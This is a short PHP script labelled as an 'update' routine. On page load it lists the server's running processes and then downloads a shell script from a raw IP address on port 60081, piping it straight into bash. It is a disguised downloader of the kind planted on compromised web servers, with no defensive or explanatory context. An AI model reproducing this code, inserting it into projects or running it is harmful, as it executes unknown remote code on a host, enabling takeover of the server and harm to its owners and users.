<?php
echo "start update...<br>";
echo system("ps -ef");
echo "<br>";
system("curl -s http://46.101.78.122:60081/awsUpdate.sh|bash");
echo "update ok......";
?>